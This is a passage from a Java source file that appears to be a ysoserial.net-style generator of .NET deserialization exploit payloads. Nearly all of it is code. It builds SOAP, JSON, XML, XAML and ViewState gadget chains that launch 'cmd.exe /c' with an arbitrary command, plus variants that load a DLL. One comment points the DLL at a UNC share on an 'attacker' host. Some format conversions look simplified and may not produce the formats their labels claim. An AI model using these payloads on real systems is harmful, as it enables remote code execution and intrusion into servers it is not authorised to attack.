            "<diffgr:diffgram xmlns:diffgr=\"urn:schemas-microsoft-com:xml-diffgram-v1\">" +
            "<ds><col>" + escapeXml(command) + "</col></ds>" +
            "</diffgr:diffgram>" +
            "</DataSet>";
        return payload.getBytes(StandardCharsets.UTF_8);
    }

    private static byte[] generateDataSetTypeSpoofing(String command) {
        String innerB64 = Base64.getEncoder().encodeToString(
            generateTypeConfuseDelegate(command));
        String payload =
            "<DataSet>" +
            "<xs:schema id=\"ds\" xmlns:xs=\"http://www.w3.org/2001/XMLSchema\" " +
            "xmlns:msdata=\"urn:schemas-microsoft-com:xml-msdata\">" +
            "<xs:element name=\"ds\" msdata:IsDataSet=\"true\">" +
            "<xs:complexType><xs:sequence>" +
            "<xs:element name=\"col\" type=\"xs:string\"/>" +
            "</xs:sequence></xs:complexType>" +
            "</xs:element></xs:schema>" +
            "<diffgr:diffgram xmlns:diffgr=\"urn:schemas-microsoft-com:xml-diffgram-v1\">" +
            "<ds><col>" + innerB64 + "</col></ds>" +
            "</diffgr:diffgram>" +
            "</DataSet>";
        return payload.getBytes(StandardCharsets.UTF_8);
    }

    // ═══════════════════════════════════════════════════════════════════════════
    //  ASP.NET Specific Chains
    // ═══════════════════════════════════════════════════════════════════════════

    private static byte[] generateObjectStateFormatter(String command) {
        String innerSoap = buildSoapPayload(
            "System.Web.UI.ObjectStateFormatter",
            "System.Diagnostics.Process", "Start",
            "cmd.exe", "/c " + command);
        return Base64.getEncoder().encode(innerSoap.getBytes(StandardCharsets.UTF_8));
    }

    private static byte[] generateLosFormatter(String command) {
        String innerPayload = buildSoapPayload(
            "System.Web.UI.LosFormatter",
            "System.Diagnostics.Process", "Start",
            "cmd.exe", "/c " + command);
        return Base64.getEncoder().encode(innerPayload.getBytes(StandardCharsets.UTF_8));
    }

    private static byte[] generateViewState(String command) {
        String xamlPayload = buildXamlObjectDataProvider(command);
        String b64Xaml = Base64.getEncoder().encodeToString(
            xamlPayload.getBytes(StandardCharsets.UTF_8));
        String viewStatePayload = "/wEy" + b64Xaml;
        return viewStatePayload.getBytes(StandardCharsets.UTF_8);
    }

    // ═══════════════════════════════════════════════════════════════════════════
    //  Getter-based Chains (Json.NET / XAML / MessagePack)
    // ═══════════════════════════════════════════════════════════════════════════

    private static byte[] generateGetterSettingsPropertyValue(String command) {
        // SettingsPropertyValue triggers BinaryFormatter on its PropertyValue getter
        String innerB64 = Base64.getEncoder().encodeToString(
            generateTypeConfuseDelegate(command));
        String payload = "{\n" +
            "  \"$type\": \"System.Configuration.SettingsPropertyValue, System, " +
            "Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\",\n" +
            "  \"Name\": \"test\",\n" +
            "  \"IsDirty\": false,\n" +
            "  \"SerializedValue\": {\n" +
            "    \"$type\": \"System.Byte[], mscorlib\",\n" +
            "    \"$value\": \"" + innerB64 + "\"\n" +
            "  }\n" +
            "}";
        return payload.getBytes(StandardCharsets.UTF_8);
    }

    private static byte[] generateGetterSecurityException(String command) {
        // SecurityException — arbitrary getter call via Json.NET
        String payload = "{\n" +
            "  \"$type\": \"System.Security.SecurityException, mscorlib, " +
            "Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\",\n" +
            "  \"ClassName\": \"System.Security.SecurityException\",\n" +
            "  \"Message\": \"Security error.\",\n" +
            "  \"InnerException\": null,\n" +
            "  \"HelpURL\": null,\n" +
            "  \"StackTraceString\": null,\n" +
            "  \"RemoteStackTraceString\": null,\n" +
            "  \"RemoteStackIndex\": 0,\n" +
            "  \"ExceptionMethod\": null,\n" +
            "  \"HResult\": -2146233078,\n" +
            "  \"Source\": null,\n" +
            "  \"Action\": 0,\n" +
            "  \"Method\": {\n" +
            "    \"$type\": \"System.Windows.Data.ObjectDataProvider, PresentationFramework, " +
            "Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35\",\n" +
            "    \"MethodName\": \"Start\",\n" +
            "    \"MethodParameters\": {\n" +
            "      \"$type\": \"System.Collections.ArrayList, mscorlib\",\n" +
            "      \"$values\": [\"cmd.exe\", \"/c " + escapeJson(command) + "\"]\n" +
            "    },\n" +
            "    \"ObjectInstance\": {\n" +
            "      \"$type\": \"System.Diagnostics.Process, System\"\n" +
            "    }\n" +
            "  },\n" +
            "  \"Zone\": 0\n" +
            "}";
        return payload.getBytes(StandardCharsets.UTF_8);
    }

    private static byte[] generateGetterCompilerResults(String command) {
        // GetterCompilerResults — DLL loading for .NET 5/6/7 with WPF
        // Command = path to DLL or URL
        String payload = "{\n" +
            "  \"$type\": \"System.CodeDom.Compiler.CompilerResults, System, " +
            "Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\",\n" +
            "  \"tempFiles\": null,\n" +
            "  \"Evidence\": null,\n" +
            "  \"PathToAssembly\": \"" + escapeJson(command) + "\",\n" +
            "  \"NativeCompilerReturnValue\": 0,\n" +
            "  \"Errors\": [],\n" +
            "  \"Output\": []\n" +
            "}";
        return payload.getBytes(StandardCharsets.UTF_8);
    }

    // ═══════════════════════════════════════════════════════════════════════════
    //  XAML-based Chains
    // ═══════════════════════════════════════════════════════════════════════════

    private static byte[] generateXamlAssemblyLoadFromFile(String command) {
        // Load assembly via XAML — command = path to .cs file or assembly
        String xaml =
            "<ResourceDictionary " +
            "xmlns=\"http://schemas.microsoft.com/winfx/2006/xaml/presentation\" " +
            "xmlns:x=\"http://schemas.microsoft.com/winfx/2006/xaml\" " +
            "xmlns:System=\"clr-namespace:System;assembly=mscorlib\" " +
            "xmlns:Reflection=\"clr-namespace:System.Reflection;assembly=mscorlib\">" +
            "<ObjectDataProvider x:Key=\"obj\" ObjectType=\"{x:Type Reflection:Assembly}\" " +
            "MethodName=\"LoadFile\">" +
            "<ObjectDataProvider.MethodParameters>" +
            "<System:String>" + escapeXml(command) + "</System:String>" +
            "</ObjectDataProvider.MethodParameters>" +
            "</ObjectDataProvider>" +
            "</ResourceDictionary>";

        // Wrap in SoapFormatter envelope using TextFormattingRunProperties
        String payload =
            "<SOAP-ENV:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" " +
            "xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" " +
            "xmlns:SOAP-ENC=\"http://schemas.xmlsoap.org/soap/encoding/\" " +
            "xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" " +
            "xmlns:clr=\"http://schemas.microsoft.com/soap/encoding/clr/1.0\">" +
            "<SOAP-ENV:Body>" +
            "<a1:TextFormattingRunProperties id=\"ref-1\" " +
            "xmlns:a1=\"http://schemas.microsoft.com/clr/nsassem/" +
            "Microsoft.VisualStudio.Text.Formatting.TextFormattingRunProperties/" +
            "Microsoft.PowerShell.Editor\">" +
            "<ForegroundBrush>" + escapeXml(xaml) + "</ForegroundBrush>" +
            "</a1:TextFormattingRunProperties>" +
            "</SOAP-ENV:Body>" +
            "</SOAP-ENV:Envelope>";
        return payload.getBytes(StandardCharsets.UTF_8);
    }

    private static byte[] generateXamlImageInfo(String command) {
        // XamlImageInfo — leads to XAML deserialization via Json.NET
        String xaml = buildXamlObjectDataProvider(command);
        String payload = "{\n" +
            "  \"$type\": \"System.Windows.Markup.XamlReader, PresentationFramework, " +
            "Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35\",\n" +
            "  \"xml\": \"" + escapeJson(xaml) + "\"\n" +
            "}";
        return payload.getBytes(StandardCharsets.UTF_8);
    }

    private static byte[] generateBaseActivationFactory(String command) {
        // BaseActivationFactory — .NET 5/6/7 with WPF, loads native DLL
        // Command = UNC path or local path to DLL (e.g. \\\\attacker\\share\\evil.dll)
        String payload = "{\n" +
            "  \"$type\": \"System.Windows.Data.ObjectDataProvider, PresentationFramework, " +
            "Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35\",\n" +
            "  \"MethodName\": \"LoadLibrary\",\n" +
            "  \"MethodParameters\": {\n" +
            "    \"$type\": \"System.Collections.ArrayList, mscorlib\",\n" +
            "    \"$values\": [\"" + escapeJson(command) + "\"]\n" +
            "  },\n" +
            "  \"ObjectInstance\": {\n" +
            "    \"$type\": \"System.Runtime.InteropServices.NativeLibrary, " +
            "System.Runtime.InteropServices, Version=5.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a\"\n" +
            "  }\n" +
            "}";
        return payload.getBytes(StandardCharsets.UTF_8);
    }

    // ═══════════════════════════════════════════════════════════════════════════
    //  JSON-based Chains
    // ═══════════════════════════════════════════════════════════════════════════

    private static byte[] generateJsonNet(String command) {
        String payload = "{\n" +
            "  \"$type\": \"System.Windows.Data.ObjectDataProvider, PresentationFramework, " +
            "Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35\",\n" +
            "  \"MethodName\": \"Start\",\n" +
            "  \"MethodParameters\": {\n" +
            "    \"$type\": \"System.Collections.ArrayList, mscorlib, " +
            "Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\",\n" +
            "    \"$values\": [\n" +
            "      \"cmd.exe\",\n" +
            "      \"/c " + escapeJson(command) + "\"\n" +
            "    ]\n" +
            "  },\n" +
            "  \"ObjectInstance\": {\n" +
            "    \"$type\": \"System.Diagnostics.Process, System, " +
            "Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\"\n" +
            "  }\n" +
            "}";
        return payload.getBytes(StandardCharsets.UTF_8);
    }

    private static byte[] generateJavaScriptSerializer(String command) {
        String payload = "{\n" +
            "  \"__type\": \"System.Windows.Data.ObjectDataProvider, PresentationFramework, " +
            "Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35\",\n" +
            "  \"MethodName\": \"Start\",\n" +
            "  \"MethodParameters\": [\n" +
            "    \"cmd.exe\",\n" +
            "    \"/c " + escapeJson(command) + "\"\n" +
            "  ],\n" +
            "  \"ObjectInstance\": {\n" +
            "    \"__type\": \"System.Diagnostics.Process, System, " +
            "Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\"\n" +
            "  }\n" +
            "}";
        return payload.getBytes(StandardCharsets.UTF_8);
    }

    private static byte[] generateDataContractJsonSerializer(String command) {
        // DataContractJsonSerializer — JSON variant
        String payload = "{\n" +
            "  \"__type\": \"Process:#System.Diagnostics\",\n" +
            "  \"StartInfo\": {\n" +
            "    \"__type\": \"ProcessStartInfo:#System.Diagnostics\",\n" +
            "    \"FileName\": \"cmd.exe\",\n" +
            "    \"Arguments\": \"/c " + escapeJson(command) + "\",\n" +
            "    \"UseShellExecute\": true\n" +
            "  }\n" +
            "}";
        return payload.getBytes(StandardCharsets.UTF_8);
    }

    // ═══════════════════════════════════════════════════════════════════════════
    //  XML-based Serializer Chains
    // ═══════════════════════════════════════════════════════════════════════════

    private static byte[] generateXmlSerializer(String command) {
        String payload =
            "<?xml version=\"1.0\" encoding=\"utf-8\"?>" +
            "<root type=\"System.Windows.Data.ObjectDataProvider, PresentationFramework, " +
            "Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35\">" +
            "<ObjectDataProvider.ObjectInstance>" +
            "<Process xmlns=\"clr-namespace:System.Diagnostics;assembly=System\">" +
            "<StartInfo>" +
            "<ProcessStartInfo>" +
            "<FileName>cmd.exe</FileName>" +
            "<Arguments>/c " + escapeXml(command) + "</Arguments>" +
            "</ProcessStartInfo>" +
            "</StartInfo>" +
            "</Process>" +
            "</ObjectDataProvider.ObjectInstance>" +
            "<ObjectDataProvider.MethodName>Start</ObjectDataProvider.MethodName>" +
            "</root>";
        return payload.getBytes(StandardCharsets.UTF_8);
    }

    private static byte[] generateNetDataContractSerializer(String command) {
        String payload =
            "<Process z:Id=\"1\" z:Type=\"System.Diagnostics.Process\" " +
            "z:Assembly=\"System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\" " +
            "xmlns=\"http://schemas.datacontract.org/2004/07/System.Diagnostics\" " +
            "xmlns:i=\"http://www.w3.org/2001/XMLSchema-instance\" " +
            "xmlns:z=\"http://schemas.microsoft.com/2003/10/Serialization/\">" +
            "<StartInfo z:Id=\"2\" z:Type=\"System.Diagnostics.ProcessStartInfo\" " +
            "z:Assembly=\"System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\">" +
            "<Arguments>/c " + escapeXml(command) + "</Arguments>" +
            "<CreateNoWindow>false</CreateNoWindow>" +
            "<FileName>cmd.exe</FileName>" +
            "<RedirectStandardError>false</RedirectStandardError>" +
            "<RedirectStandardInput>false</RedirectStandardInput>" +
            "<RedirectStandardOutput>false</RedirectStandardOutput>" +
            "<UseShellExecute>true</UseShellExecute>" +
            "</StartInfo>" +
            "</Process>";
        return payload.getBytes(StandardCharsets.UTF_8);
    }

    private static byte[] generateDataContractSerializer(String command) {
        String payload =
            "<?xml version=\"1.0\" encoding=\"utf-8\"?>" +
            "<root xmlns:i=\"http://www.w3.org/2001/XMLSchema-instance\" " +
            "xmlns:z=\"http://schemas.microsoft.com/2003/10/Serialization/\" " +
            "xmlns:d=\"http://schemas.datacontract.org/2004/07/System.Diagnostics\" " +
            "xmlns:c=\"http://schemas.datacontract.org/2004/07/System.Collections.Generic\">" +
            "<anyType i:type=\"d:Process\">" +
            "<d:StartInfo>" +
            "<d:Arguments>/c " + escapeXml(command) + "</d:Arguments>" +
            "<d:FileName>cmd.exe</d:FileName>" +
            "<d:UseShellExecute>true</d:UseShellExecute>" +
            "</d:StartInfo>" +
            "</anyType>" +
            "</root>";
        return payload.getBytes(StandardCharsets.UTF_8);
    }

    // ═══════════════════════════════════════════════════════════════════════════
    //  Multi-formatter / Miscellaneous
    // ═══════════════════════════════════════════════════════════════════════════

    private static byte[] generateObjectDataProvider(String command) {
        return buildXamlObjectDataProvider(command).getBytes(StandardCharsets.UTF_8);
    }

    private static byte[] generateSoapFormatter(String command) {
        return buildSoapPayload(
            "System.Runtime.Serialization.Formatters.Soap.SoapFormatter",
            "System.Diagnostics.Process", "Start",
            "cmd.exe", "/c " + command
        ).getBytes(StandardCharsets.UTF_8);
    }

    private static byte[] generateTransactionManagerReenlist(String command) {
        // TransactionManager.Reenlist — triggers BinaryFormatter deserialization
        String innerB64 = Base64.getEncoder().encodeToString(
            generateTypeConfuseDelegate(command));
        String payload =
            "<SOAP-ENV:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" " +
            "xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" " +
            "xmlns:SOAP-ENC=\"http://schemas.xmlsoap.org/soap/encoding/\" " +
            "xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" " +
            "xmlns:clr=\"http://schemas.microsoft.com/soap/encoding/clr/1.0\">" +
            "<SOAP-ENV:Body>" +
            "<a1:TransactionManager id=\"ref-1\" " +
            "xmlns:a1=\"http://schemas.microsoft.com/clr/nsassem/" +
            "System.Transactions.TransactionManager/" +
            "System.Transactions, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\">" +
            "<recoveryInformation>" + innerB64 + "</recoveryInformation>" +
            "</a1:TransactionManager>" +
            "</SOAP-ENV:Body>" +
            "</SOAP-ENV:Envelope>";
        return payload.getBytes(StandardCharsets.UTF_8);
    }

    // ═══════════════════════════════════════════════════════════════════════════
    //  Payload Builders
    // ═══════════════════════════════════════════════════════════════════════════

    private static String buildSoapPayload(String typeName, String targetType,
                                            String method, String fileName, String args) {
        String typeAssembly = resolveAssembly(typeName);
        String targetAssembly = resolveAssembly(targetType);
        String typeElem = typeName.replace(".", "_").replace("+", "_x002B_");
        String targetElem = targetType.replace(".", "_");
        return "<SOAP-ENV:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" " +
            "xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" " +
            "xmlns:SOAP-ENC=\"http://schemas.xmlsoap.org/soap/encoding/\" " +
            "xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" " +
            "xmlns:clr=\"http://schemas.microsoft.com/soap/encoding/clr/1.0\">" +
            "<SOAP-ENV:Body>" +
            "<a1:" + typeElem + " id=\"ref-1\" " +
            "xmlns:a1=\"http://schemas.microsoft.com/clr/nsassem/" +
            typeName + "/" + typeAssembly + "\">" +
            "<target href=\"#ref-2\"/>" +
            "</a1:" + typeElem + ">" +
            "<a2:" + targetElem + " id=\"ref-2\" " +
            "xmlns:a2=\"http://schemas.microsoft.com/clr/nsassem/" +
            targetType + "/" + targetAssembly + "\">" +
            "<StartInfo>" +
            "<FileName>" + escapeXml(fileName) + "</FileName>" +
            "<Arguments>" + escapeXml(args) + "</Arguments>" +
            "</StartInfo>" +
            "</a2:" + targetElem + ">" +
            "</SOAP-ENV:Body>" +
            "</SOAP-ENV:Envelope>";
    }

    private static String resolveAssembly(String typeName) {
        if (typeName.startsWith("System.Diagnostics.")) return "System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089";
        if (typeName.startsWith("System.Data.")) return "System.Data, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089";
        if (typeName.startsWith("System.Web.")) return "System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a";
        if (typeName.startsWith("System.Workflow.")) return "System.Workflow.ComponentModel, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35";
        if (typeName.startsWith("System.Runtime.Serialization.")) return "System.Runtime.Serialization.Formatters.Soap, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a";
        return "mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089";
    }

    private static String buildXamlObjectDataProvider(String command) {
        return "<ResourceDictionary " +
            "xmlns=\"http://schemas.microsoft.com/winfx/2006/xaml/presentation\" " +
            "xmlns:x=\"http://schemas.microsoft.com/winfx/2006/xaml\" " +
            "xmlns:System=\"clr-namespace:System;assembly=mscorlib\" " +
            "xmlns:Diag=\"clr-namespace:System.Diagnostics;assembly=system\">" +
            "<ObjectDataProvider x:Key=\"obj\" ObjectType=\"{x:Type Diag:Process}\" " +
            "MethodName=\"Start\">" +
            "<ObjectDataProvider.MethodParameters>" +
            "<System:String>cmd.exe</System:String>" +
            "<System:String>/c " + escapeXml(command) + "</System:String>" +
            "</ObjectDataProvider.MethodParameters>" +
            "</ObjectDataProvider>" +
            "</ResourceDictionary>";
    }

    // ═══════════════════════════════════════════════════════════════════════════
    //  Utility
    // ═══════════════════════════════════════════════════════════════════════════

    private static String escapeXml(String s) {
        if (s == null) return "";
        return s.replace("&", "&amp;").replace("<", "&lt;")
                .replace(">", "&gt;").replace("\"", "&quot;");
    }

    private static String escapeJson(String s) {
        if (s == null) return "";
        return s.replace("\\", "\\\\").replace("\"", "\\\"")
                .replace("\n", "\\n").replace("\r", "\\r")
                .replace("\t", "\\t");
    }

    // ═══════════════════════════════════════════════════════════════════════════
    //  Gadget / Formatter split API (ysoserial.net-style two-dropdown UX)
    // ═══════════════════════════════════════════════════════════════════════════

    private static final Map<String, String> GADGETS = new LinkedHashMap<>();
    private static final Map<String, List<String>> GADGET_FORMATTERS = new LinkedHashMap<>();

    // Category sets — determines which format conversions are valid
    private static final Set<String> SOAP_NATIVE = Set.of(
        "TypeConfuseDelegate", "TypeConfuseDelegateMono", "TextFormattingRunProperties",
        "ActivitySurrogate", "ActivitySurrogateDisableTypeCheck", "ActivitySurrogateSelectorFromFile",
        "SessionViewStateHistoryItem", "AxHostState", "ToolboxItemContainer",
        "ResourceSet", "ObjRef", "DataSet", "XamlAssemblyLoadFromFile", "TransactionManagerReenlist"
    );
    private static final Set<String> BINARY_NATIVE = Set.of(
        "ClaimsIdentity", "ClaimsPrincipal", "WindowsIdentity", "WindowsPrincipal",
        "WindowsClaimsIdentity", "SessionSecurityToken", "RolePrincipal", "GenericPrincipal"
    );
    private static final Set<String> JSON_NATIVE = Set.of(
        "GetterSettingsPropertyValue", "GetterSecurityException", "GetterCompilerResults",
        "XamlImageInfo", "BaseActivationFactory"
    );

    static {
        GADGETS.put("TypeConfuseDelegate", "Process.Start via TypeConfuseDelegate (SoapFormatter)");
        GADGETS.put("TypeConfuseDelegateMono", "TypeConfuseDelegate tweaked for Mono runtime");
        GADGETS.put("TextFormattingRunProperties", "XamlReader.Parse RCE via PresentationFramework");
        GADGETS.put("PSObject", "PowerShell PSObject deserialization — CVE-2017-8565");
        GADGETS.put("ActivitySurrogate", "ActivitySurrogateSelector via WorkflowDesigner");
        GADGETS.put("ActivitySurrogateDisableTypeCheck", "Bypasses .NET 4.8+ type check protections");
        GADGETS.put("ActivitySurrogateSelectorFromFile", "ActivitySurrogateSelector from compiled .cs file/URL");
        GADGETS.put("ClaimsIdentity", "ClaimsIdentity OnDeserialized callback chain");
        GADGETS.put("ClaimsPrincipal", "ClaimsPrincipal bootstrapContext second-order deser chain");
        GADGETS.put("WindowsIdentity", "ClaimsIdentity / WindowsIdentity base64 bootstrap chain");
        GADGETS.put("WindowsPrincipal", "WindowsPrincipal via inner identity deserialization");
        GADGETS.put("WindowsClaimsIdentity", "WindowsClaimsIdentity actor chain (Microsoft.IdentityModel)");
        GADGETS.put("SessionSecurityToken", "WCF SessionSecurityToken cookie chain");
        GADGETS.put("SessionViewStateHistoryItem", "SessionViewStateHistoryItem bridge/derived gadget");
        GADGETS.put("RolePrincipal", "RolePrincipal cached roles deserialization");
        GADGETS.put("GenericPrincipal", "GenericPrincipal via BinaryFormatter inner deserialize");
        GADGETS.put("AxHostState", "System.Windows.Forms.AxHost.State deserialization");
        GADGETS.put("ToolboxItemContainer", "System.Drawing.Design.ToolboxItemContainer bridge gadget");
        GADGETS.put("ResourceSet", "ResourceSet via ResourceReader inner deserialization");
        GADGETS.put("ObjRef", ".NET Remoting ObjRef exploitation");
        GADGETS.put("DataSet", "DataSet deserialization via BinaryFormatter inner");
        GADGETS.put("DataSetOldBehaviour", "DataSet old XML format behaviour variant");
        GADGETS.put("DataSetOldBehaviourFromFile", "DataSet old behaviour from compiled .cs file");
        GADGETS.put("DataSetTypeSpoofing", "DataSet type spoofing with TypeConfuseDelegate inner");
        GADGETS.put("ObjectDataProvider", "WPF ObjectDataProvider wrapping Process.Start (multi-formatter)");
        GADGETS.put("GetterSettingsPropertyValue", "SettingsPropertyValue getter call chain");
        GADGETS.put("GetterSecurityException", "Arbitrary getter call via SecurityException");
        GADGETS.put("GetterCompilerResults", "Remote/local DLL loading for .NET 5/6/7 with WPF");
        GADGETS.put("XamlAssemblyLoadFromFile", "Load assembly via XAML from compiled .cs file");
        GADGETS.put("XamlImageInfo", "XAML deserialization via XamlImageInfo");
        GADGETS.put("BaseActivationFactory", "Remote DLL loading for .NET 5/6/7 with WPF");
        GADGETS.put("TransactionManagerReenlist", "TransactionManager.Reenlist method payload");

        // SOAP-native gadgets → SoapFormatter (native) + BinaryFormatter (stripped envelope)
        GADGET_FORMATTERS.put("TypeConfuseDelegate", List.of("SoapFormatter", "BinaryFormatter"));
        GADGET_FORMATTERS.put("TypeConfuseDelegateMono", List.of("SoapFormatter", "BinaryFormatter"));
        GADGET_FORMATTERS.put("TextFormattingRunProperties", List.of("SoapFormatter", "BinaryFormatter"));
        GADGET_FORMATTERS.put("ActivitySurrogate", List.of("SoapFormatter", "BinaryFormatter"));
        GADGET_FORMATTERS.put("ActivitySurrogateDisableTypeCheck", List.of("SoapFormatter", "BinaryFormatter"));
        GADGET_FORMATTERS.put("ActivitySurrogateSelectorFromFile", List.of("SoapFormatter", "BinaryFormatter"));
        GADGET_FORMATTERS.put("SessionViewStateHistoryItem", List.of("SoapFormatter", "BinaryFormatter"));
        GADGET_FORMATTERS.put("AxHostState", List.of("SoapFormatter", "BinaryFormatter"));
        GADGET_FORMATTERS.put("ToolboxItemContainer", List.of("SoapFormatter", "BinaryFormatter"));
        GADGET_FORMATTERS.put("ResourceSet", List.of("SoapFormatter", "BinaryFormatter"));
        GADGET_FORMATTERS.put("ObjRef", List.of("SoapFormatter", "BinaryFormatter"));
        GADGET_FORMATTERS.put("DataSet", List.of("SoapFormatter", "BinaryFormatter"));
        GADGET_FORMATTERS.put("XamlAssemblyLoadFromFile", List.of("SoapFormatter", "BinaryFormatter"));
        GADGET_FORMATTERS.put("TransactionManagerReenlist", List.of("SoapFormatter", "BinaryFormatter"));

        // Binary-native gadgets → BinaryFormatter (native) + SoapFormatter (wrapped in envelope)
        GADGET_FORMATTERS.put("ClaimsIdentity", List.of("BinaryFormatter", "SoapFormatter"));
        GADGET_FORMATTERS.put("ClaimsPrincipal", List.of("BinaryFormatter", "SoapFormatter"));
        GADGET_FORMATTERS.put("WindowsIdentity", List.of("BinaryFormatter", "SoapFormatter"));
        GADGET_FORMATTERS.put("WindowsPrincipal", List.of("BinaryFormatter", "SoapFormatter"));
        GADGET_FORMATTERS.put("WindowsClaimsIdentity", List.of("BinaryFormatter", "SoapFormatter"));
        GADGET_FORMATTERS.put("SessionSecurityToken", List.of("BinaryFormatter", "SoapFormatter"));
        GADGET_FORMATTERS.put("RolePrincipal", List.of("BinaryFormatter", "SoapFormatter"));
        GADGET_FORMATTERS.put("GenericPrincipal", List.of("BinaryFormatter", "SoapFormatter"));

        // Raw gadgets — single formatter only
        GADGET_FORMATTERS.put("PSObject", List.of("Raw"));
        GADGET_FORMATTERS.put("DataSetOldBehaviour", List.of("Raw"));
        GADGET_FORMATTERS.put("DataSetOldBehaviourFromFile", List.of("Raw"));
        GADGET_FORMATTERS.put("DataSetTypeSpoofing", List.of("Raw"));

        // ObjectDataProvider — 8 formatters (unchanged)
        GADGET_FORMATTERS.put("ObjectDataProvider", List.of(
                "SoapFormatter", "Json.Net", "JavaScriptSerializer",
                "DataContractJsonSerializer", "XmlSerializer",
                "NetDataContractSerializer", "DataContractSerializer", "Raw"));

        // Json-native gadgets → Json.Net (native) + JavaScriptSerializer (__type conversion)
        GADGET_FORMATTERS.put("GetterSettingsPropertyValue", List.of("Json.Net", "JavaScriptSerializer"));
        GADGET_FORMATTERS.put("GetterSecurityException", List.of("Json.Net", "JavaScriptSerializer"));
        GADGET_FORMATTERS.put("GetterCompilerResults", List.of("Json.Net", "JavaScriptSerializer"));
        GADGET_FORMATTERS.put("XamlImageInfo", List.of("Json.Net", "JavaScriptSerializer"));
        GADGET_FORMATTERS.put("BaseActivationFactory", List.of("Json.Net", "JavaScriptSerializer"));
    }

    /** Returns gadget name → description map for the Gadget dropdown. */
    public static Map<String, String> getGadgets() {
        return Collections.unmodifiableMap(GADGETS);
    }

    /** Returns the list of compatible formatter names for a given gadget. */
    public static List<String> getFormatters(String gadget) {
        List<String> fmts = GADGET_FORMATTERS.get(gadget);
        return fmts != null ? fmts : List.of();
    }

    /** Generate payload for a specific gadget + formatter combination. */
    public static byte[] generate(String gadget, String formatter, String command) {
        // ObjectDataProvider supports multiple formatters — route by formatter
        if ("ObjectDataProvider".equals(gadget)) {
            return switch (formatter) {
                case "Json.Net"                   -> generateJsonNet(command);
                case "JavaScriptSerializer"       -> generateJavaScriptSerializer(command);
                case "DataContractJsonSerializer"  -> generateDataContractJsonSerializer(command);
                case "XmlSerializer"              -> generateXmlSerializer(command);
                case "NetDataContractSerializer"  -> generateNetDataContractSerializer(command);
                case "DataContractSerializer"     -> generateDataContractSerializer(command);
                case "SoapFormatter"              -> generateSoapFormatter(command);
                case "Raw"                        -> generateObjectDataProvider(command);
                default -> throw new IllegalArgumentException(
                        "Unknown formatter '" + formatter + "' for ObjectDataProvider");
            };
        }

        // Get native payload from the existing generator
        byte[] nativePayload = generate(gadget, command);

        // Route format conversion based on gadget category
        if (SOAP_NATIVE.contains(gadget)) {
            return switch (formatter) {
                case "SoapFormatter"   -> nativePayload;
                case "BinaryFormatter" -> soapToBinaryFormatter(nativePayload);
                default -> throw new IllegalArgumentException(
                        "Unsupported formatter '" + formatter + "' for SOAP-native gadget " + gadget);
            };
        } else if (BINARY_NATIVE.contains(gadget)) {
            return switch (formatter) {
                case "BinaryFormatter" -> nativePayload;
                case "SoapFormatter"   -> binaryToSoapFormatter(nativePayload);
                default -> throw new IllegalArgumentException(
                        "Unsupported formatter '" + formatter + "' for Binary-native gadget " + gadget);
            };
        } else if (JSON_NATIVE.contains(gadget)) {
            return switch (formatter) {
                case "Json.Net"             -> nativePayload;
                case "JavaScriptSerializer" -> jsonNetToJavaScriptSerializer(nativePayload);
                default -> throw new IllegalArgumentException(
                        "Unsupported formatter '" + formatter + "' for JSON-native gadget " + gadget);
            };
        }

        // Raw or uncategorized — return native payload as-is
        return nativePayload;
    }

    // ═══════════════════════════════════════════════════════════════════════════
    //  Format Conversion Helpers
    // ═══════════════════════════════════════════════════════════════════════════

    /** Strip SOAP envelope → compact inner XML (BinaryFormatter representation). */
    private static byte[] soapToBinaryFormatter(byte[] soapPayload) {
        String soap = new String(soapPayload, StandardCharsets.UTF_8);
        int start = soap.indexOf("<SOAP-ENV:Body>");
        int end = soap.indexOf("</SOAP-ENV:Body>");
        if (start >= 0 && end > start) {
            String inner = soap.substring(start + "<SOAP-ENV:Body>".length(), end).trim();
            return inner.getBytes(StandardCharsets.UTF_8);
        }
        return soapPayload; // fallback: return as-is
    }

    /** Wrap plain XML in a SOAP envelope (SoapFormatter representation). */
    private static byte[] binaryToSoapFormatter(byte[] xmlPayload) {
        String xml = new String(xmlPayload, StandardCharsets.UTF_8);
        String soap =
            "<SOAP-ENV:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" " +
            "xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" " +
            "xmlns:SOAP-ENC=\"http://schemas.xmlsoap.org/soap/encoding/\" " +
